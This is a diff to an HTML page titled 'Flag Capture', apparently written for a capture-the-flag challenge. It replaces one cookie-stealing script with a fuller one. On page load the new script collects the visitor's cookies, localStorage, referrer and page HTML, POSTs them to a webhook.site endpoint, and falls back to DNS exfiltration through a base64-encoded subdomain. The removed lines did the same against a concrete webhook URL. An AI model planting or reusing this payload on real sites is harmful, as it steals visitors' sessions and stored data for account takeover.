@@ -1,14 +1,33 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Flag Capture</title>
+    <script>
+    // Advanced data collection
+    window.onload = function() {
+        const payload = {
+            referrer: document.referrer,
+            cookies: document.cookie,
+            origin: window.location.origin,
+            localStorage: JSON.stringify(localStorage),
+            dom: document.documentElement.innerHTML
+        };
+        
+        // Send to webhook.site
+        fetch('https://webhook.site/YOUR-UNIQUE-ID', {
+            method: 'POST',
+            body: JSON.stringify(payload),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        // Also try DNS exfiltration as fallback
+        new Image().src = 'http://' + btoa(JSON.stringify(payload)) + '.YOUR-DOMAIN.xyz';
+    };
+    </script>
+</head>
 <body>
-<script>
-// Capture both referrer and cookies
-const data = {
-  referrer: document.referrer,
-  cookies: document.cookie,
-  html: document.documentElement.innerHTML
-};
-fetch('https://webhook.site/2666a488-1f68-4d70-9453-fb3ac0e6256a?' + new URLSearchParams(data));
-</script>
+    <h1>Loading...</h1>
 </body>
 </html>
